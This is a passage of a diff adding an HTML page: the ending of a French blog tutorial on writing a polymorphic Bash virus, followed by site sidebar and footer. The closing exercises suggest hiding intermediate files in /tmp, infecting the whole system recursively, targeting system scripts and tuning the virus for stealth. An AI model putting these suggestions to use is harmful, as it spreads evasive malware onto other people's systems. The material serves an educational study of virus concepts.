+<p>On utilise des fichiers intermédiaires <code>virus</code>, <code>test</code> et <code>infection</code> afin d'ordonner le code permuté du virus présent dans un fichier infecté, l'exécuter et reproduire le virus (car sed a notamment besoin qu'on lui passe un fichier en argument). Ce n'est pas très discret, vous pourriez améliorer cela (petite indication : servez-vous de /tmp/).</p>
+</li>
+<li>
+<p>Notre virus n'infecte que les fichiers du répertoire courant. Essayez d'étendre ce comportement afin d'explorer récursivement tout le système !</p>
+</li>
+<li>
+<p>Notre virus n'infecte que les fichiers en <code>.sh</code>, il serait t'intéressant d'étendre son infection aux scripts du système.</p>
+</li>
+<li>
+<p>Vous pouvez aussi vous amuser à jouer avec la furtivité du virus : essayez d'accélérer son fonctionnement (en utilisant le moins d'écriture disque intermédiaire possible) afin de rendre son exécution la brève possible et donc de passer plus inaperçu en cas de traitement de milliers de fichiers. Vous pouvez au contraire rendre son exécution beaucoup plus lente afin d'améliorer sa survie, etc.</p>
+</li>
+</ul>
+<p>Au fil de cet article, nous avons pu étudier un peu deux des trois principaux concepts qui régissent les virus et ce, en aboutissant à un petit virus polymorphe. Afin de comprendre en profondeur tous les codes qui se trouvent dans cet article (si vous avez un peu de mal), il me paraît essentiel de pratiquer un peu afin de vous rendre compte vous-même des problèmes pratiques que peut poser le polymorphisme, par exemple, et des solutions que vous pouvez trouver pour les résoudre. N'hésitez pas à partager vos expériences dans les commentaires !</p>
+<p>Certains d'entre vous seront peut-être déçus par cette modeste introduction qui présente des principes généraux à la base des virus mais dans le cas un peu particulier d'une implémentation en Bash. Je vous avoue que je n'ai pas encore réfléchi en profondeur au problème du polymorphisme, par exemple, dans le cas général. Intuitivement, je dirai qu'il faudrait se pencher sur la théorie afin de pouvoir traiter ce cas général. Peut-être faut-il également s'intéresser aux <a href="http://fr.wikipedia.org/wiki/Quine_(informatique)">quines</a> multi-langages, qui paraît être une voie intéressante (puisque mine de rien, on utilise un quine en Bash qu'on permute par la suite). Bref, je compte m'intéresser à cette question et peut-être que je rédigerai un prochain article sur le sujet. Pour l'heure, je pense encore avancer en développant un peu plus notre virus (notamment en m'intéressant à la furtivité du virus et à sa charge utile (nous en reparlerons)) et en faire un prochain billet.</p>
+<p><em>Cet article est issu de mon <a href="http://tcpc.isomorphis.me/blog/">blog</a>, retrouvez-y des articles bonus et autres joyeusetés ! <a href="https://twitter.com/tcpc_">Suivez-moi</a> sur Twitter afin d'être tenu au courant des derniers articles.</em></p>
+        </div>
+    </section>
+        </div>
+        <div class="col-sm-3" id="sidebar">
+            <aside>
+
+<section class="well well-sm">
+    <ul class="list-group list-group-flush">
+
+        <!-- Search bar in low width mode -->
+        <li id="searchSideBar" class="list-group-item"><span>
+                <form class="navbar-search" action="/blog/search">
+                  <input type="text" class="search-query" placeholder="Rechercher" name="q" id="tipue_search_input" required>
+                </form></span>
+        </li>
+
+        <li class="list-group-item"><h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Social</span></h4>
+              <ul class="list-group" id="social">
+                    <li class="list-group-item"><a href="https://example.org">
+                        <i class="fa fa-comment fa-lg"></i>
+                       Link 1</a>
+                    </li>
+                    <li class="list-group-item"><a href="https://example.org">
+                        <i class="fa fa-comments fa-lg"></i>
+                       Link 2</a>
+                    </li>
+                    <li class="list-group-item"><a href="/page/content">
+                        <i class="fa fa-etc fa-lg"></i>
+                       etc</a>
+                    </li>
+              </ul>
+            </li>
+
+
+            <li class="list-group-item"><a href="http://yliesc.github.io/"><h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Categories</span></h4></a>
+                <ul class="list-group" id="categories">
+                </ul>
+            </li>
+
+
+
+    <li class="list-group-item"><h4><i class="fa fa-link fa-lg"></i><span class="icon-label">External Links</span></h4>
+      <ul class="list-group" id="links">
+        <li class="list-group-item">
+            <a href="https://example.org" target="_blank">
+                Link 1
+            </a>
+        </li>
+        <li class="list-group-item">
+            <a href="https://example.org" target="_blank">
+                Link 2
+            </a>
+        </li>
+        <li class="list-group-item">
+            <a href="/page/content" target="_blank">
+                etc
+            </a>
+        </li>
+      </ul>
+    </li>
+
+        <li class="list-group-item" id="github">
+            <ul class="list-group">
+                <li class="list-group-item"><h5>Vous voyez une erreur ?</h5></li>
+                <li class="list-group-item">
+                    <a class="btn btn-info github" target="_blank" href="https://github.com/YliesC/website/edit/master/content/pages/pdp/content/programmez-votre-premier-virus-unix.md">
+                        <i class="fa fa-random"></i> Modifiez la page sur GitHub
+                    </a>
+                </li>
+            </ul>
+        </li>
+    </ul>
+</section>            </aside>
+        </div>
+    </div>
+</div>
+<footer>
+   <div class="container">
+      <hr>
+      <div class="row">
+         <div class="col-xs-10">&copy;  
+            &middot; Powered by <a href="https://github.com/getpelican/pelican-themes/tree/master/pelican-bootstrap3" target="_blank">pelican-bootstrap3</a>,
+            <a href="http://docs.getpelican.com/" target="_blank">Pelican</a>,
+<a href="http://getbootstrap.com" target="_blank">Bootstrap</a>                <p><small>  <a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed.fr"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-sa/4.0/80x15.png" /></a>
+    Content
+  licensed under a <a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed.fr">Creative Commons Attribution-ShareAlike 4.0 International License</a>, except where indicated otherwise.
+</small></p>
+         </div>
+         <div class="col-xs-2"><p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p></div>
+      </div>
+   </div>
+</footer>
+<script src="http://yliesc.github.io/theme/js/jquery.min.js"></script>
+
+<!-- Include all compiled plugins (below), or include individual files as needed -->
+<script src="http://yliesc.github.io/theme/js/bootstrap.min.js"></script>
+
+<!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
+<script src="http://yliesc.github.io/theme/js/respond.min.js"></script>
+
+<!--  -->
+
+
+</body>
+</html>
